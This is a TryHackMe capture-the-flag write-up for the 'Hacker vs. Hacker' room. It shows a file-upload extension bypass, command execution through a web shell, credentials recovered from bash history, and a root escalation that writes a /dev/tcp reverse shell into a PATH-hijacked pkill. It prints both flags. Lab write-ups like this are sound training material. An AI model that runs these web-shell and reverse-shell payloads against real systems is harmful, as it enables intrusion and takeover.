## Hacker vs. Hacker - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/hackervshacker)

<i>The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?</i>

**IP: 10.10.151.54**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, File Upload Bypass <br>

**Tools Used**: Nmap, Ffuf<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and Ffuf.

  ```
  nmap -sC -sV -T5 -p- 10.10.151.54

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
  |   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
  |_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: RecruitSec: Industry Leading Infosec Recruitment
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -u http://10.10.151.54/FUZZ -w /seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

  images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 47ms]
  css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 48ms]
  cvs                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 46ms]
  dist                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 47ms]
  ```
  
- In the main page source code you can find this:

  ```
        <!-- seriously, we need to fire that stupid developer intern -->
    </div>
  </div>

  <div class="section categories">
    <div class="container">
      <h3 class="section-heading">Want to join our stable of body-shopped professionals?</h3>
      <p class="section-description">Please upload your CV below and we will get back to you if we think your skills might earn us a profit for doing nothing beyond sending a few emails.</p>
      <form action="upload.php" method="post" enctype="multipart/form-data">
        <input class="button" type="file" name="fileToUpload" id="fileToUpload">
        <input class="button-primary" type="submit" value="Upload CV" name="submit">
        <!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->
  ```
  
- When I visited `/cvs` I got this:

  ```Directory listing disabled```

---

## 🌐 Web Exploitation

- So now, I uploaded a classic PHP reverse shell and got this message:

  ```Hacked! If you dont want me to upload my shell, do better at filtering!```
  
- In the source code of `/uploads.php` you can find this:

  ```
  Hacked! If you dont want me to upload my shell, do better at filtering!
  
  <!-- seriously, dumb stuff:
  
  $target_dir = "cvs/";
  $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
  
  if (!strpos($target_file, ".pdf")) {
    echo "Only PDF CVs are accepted.";
  } else if (file_exists($target_file)) {
    echo "This CV has already been uploaded!";
  } else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
    echo "Success! We will get back to you.";
  } else {
    echo "Something went wrong :|";
  }
  
  -->
  ```

- OK, so I changed the extension of my shell to .pdf.php and uploaded it again but still got the same message. But when I fuzzed that `/cvs` directory, I actually found my shell on the server!

  ```
  ffuf -u http://10.10.151.54/cvs/FUZZ.pdf.php -w /usr/share/wordlists/dirb/common.txt

  .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3018ms]
  .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4024ms]
  .hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4025ms]
  shell                   [Status: 200, Size: 18, Words: 1, Lines: 2, Duration: 177ms]
  ```
  
- Since shell was actually uploaded, I started fuzzing for command injection.

  ```
  ffuf -u http://10.10.151.54/cvs/shell.pdf.php?FUZZ=id -w /usr/share/wordlists/dirb/common.txt -fw 1

  cmd                     [Status: 200, Size: 72, Words: 3, Lines: 3, Duration: 50ms]
  ```

- Confirming command injection:

  ```
  http://10.10.151.54/cvs/shell.pdf.php?cmd=id

  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
  boom!
  ```

---

## 🧍 User Privilege Escalation

- You can read the first flag on the web app.

  ```
  http://10.10.151.54/cvs/shell.pdf.php?cmd=ls%20-al%20/home/lachlan

  total 36
  drwxr-xr-x 4 lachlan lachlan 4096 May  5  2022 .
  drwxr-xr-x 3 root    root    4096 May  5  2022 ..
  -rw-r--r-- 1 lachlan lachlan  168 May  5  2022 .bash_history
  -rw-r--r-- 1 lachlan lachlan  220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 lachlan lachlan 3771 Feb 25  2020 .bashrc
  drwx------ 2 lachlan lachlan 4096 May  5  2022 .cache
  -rw-r--r-- 1 lachlan lachlan  807 Feb 25  2020 .profile
  drwxr-xr-x 2 lachlan lachlan 4096 May  5  2022 bin
  -rw-r--r-- 1 lachlan lachlan   38 May  5  2022 user.txt
  
  boom!
  
  http://10.10.151.54/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt
  
  thm{af7e46b68081d4025c5ce10851430617}
  
  boom!
  ```
  
- Let's get root now.

---

## 👑 Root Privilege Escalation

- Now, I checked `.bash_history` file:

  ```
  http://10.10.151.54/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history

  ./cve.sh
  ./cve-patch.sh
  vi /etc/cron.d/persistence
  echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
  ls -sf /dev/null /home/lachlan/.bash_history
  
  boom!
  ```
  
- OK, so now we have credentials `lachlan:thisistheway123` and when I connected with SSH, I got kicked out of it immediately.

  ```
  ssh lachlan@10.10.151.54
  thisistheway123
  
  lachlan@10.10.151.54's password: 
  Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
  [SNIP!]
  Last login: Thu May  5 04:39:19 2022 from 192.168.56.1
  $ nope
  Connection to 10.10.151.54 closed.
  ```
  
- NOPE! Well, let's investigate what is going on here. First, I checked the cronjob file `/etc/cron.d/persistence`.

  ```
  http://10.10.151.54/cvs/shell.pdf.php?cmd=cat%20/etc/cron.d/persistence

  PATH=/home/lachlan/bin:/bin:/usr/bin
  # * * * * * root backup.sh
  * * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  * * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  * * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  * * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  * * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  * * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
  
  boom!
  ```

- OK, so it's a malicous cronjob that will kick anyone who logs in with SSH. In order to bypass it, we will overwrite `pkill` with reverse shell. First start a listener and copy this payload:

  ```
  nc -lvnp 4444
  listening on [any] 4444 ...
  
  echo "bash -c '/bin/bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1'">bin/pkill ; chmod +x bin/pkill
  ```

- Now you gotta go fast! Login through SSH and as soon as you are in paste the payload and run it (press Enter). After executing it you will receive a connection on your listener with root access.

  ```
  Last login: Mon May 26 21:34:04 2025 from 10.8.120.52
  $ echo "bash -c '/bin/bash -i >& /dev/tcp/10.8.120.52/4444 0>&1'">bin/pkill ; chmod +x bin/pkill
  $ whoami
  lachlan
  $ nope

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.151.54] 56970
  bash: cannot set terminal process group (3914): Inappropriate ioctl for device
  bash: no job control in this shell
  root@b2r:~# whoami
  whoami
  root
  root@b2r:~# id
  id
  uid=0(root) gid=0(root) groups=0(root)
  ```

- Important tip: If you try this payload `echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.120.52/4444 0>&1'">/bin/pkill ; chmod +x /bin/pkill`, it wont work because you can't overwrite system files as regular user, only root can!

- Now just read the flag.

  ```
  root@b2r:~# pwd
  pwd
  /root
  
  root@b2r:~# ls -al
  ls -al
  total 28
  drwx------  4 root root 4096 May  5  2022 .
  drwxr-xr-x 19 root root 4096 May  5  2022 ..
  lrwxrwxrwx  1 root root    9 May  5  2022 .bash_history -> /dev/null
  -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
  -rw-r--r--  1 root root  161 Dec  5  2019 .profile
  -rw-r--r--  1 root root   38 May  5  2022 root.txt
  drwx------  3 root root 4096 May  5  2022 snap
  drwx------  2 root root 4096 May  5  2022 .ssh
  
  root@b2r:~# cat root.txt
  cat root.txt
  thm{7b708e5224f666d3562647816ee2a1d4}
  ```

---

## 🏁 Flags

- **User Flag**: `thm{af7e46b68081d4025c5ce10851430617}`
- **Root Flag**: `thm{7b708e5224f666d3562647816ee2a1d4}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way to root.`

- What did I learn?
  `New privilege escalation and some new file upload bypass techiniques.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
